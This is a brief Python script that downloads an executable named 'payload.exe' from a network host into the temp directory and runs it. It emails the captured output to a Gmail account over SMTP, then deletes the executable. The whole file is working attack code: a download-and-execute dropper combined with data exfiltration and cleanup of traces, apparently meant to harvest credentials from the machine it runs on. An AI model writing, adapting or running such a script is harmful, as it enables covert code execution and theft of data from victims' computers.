import subprocess
import smtplib
import requests
import os
import tempfile

def downloader(url):
    res = requests.get(url)
    res_list = url.split("/")[-1]
    with open(res_list, "wb") as output:
        output.write(res.content)

def mail_sender(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
downloader("http://192.168.1.90/payload.exe")
response = subprocess.check_output("payload.exe all", shell=True)
mail_sender("mail", "pass", response)
os.remove("payload.exe")